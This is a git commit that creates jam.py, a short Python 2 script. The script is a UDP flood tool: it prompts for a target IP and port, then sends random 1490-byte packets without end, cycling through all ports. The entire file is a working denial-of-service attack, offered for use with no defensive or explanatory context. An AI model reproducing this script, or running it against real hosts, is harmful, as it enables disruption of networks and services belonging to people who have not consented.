ae18b25cd4b92326abe150258feaff4f16a0e4dd
Marid7 <100313410+Marid7@users.noreply.github.com>
2022-04-03 22:16:54 +0600

    Create jam.py

---
+++ jam.py
@@ -0,0 +1,30 @@
+import sys
+import os
+import time
+import socket
+import random
+#Code
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+print "\033[0;31m"
+
+ip = raw_input("[*]Enter Target Ip : ")
+port = int(raw_input("[*]Enter Target Port : "))
+
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
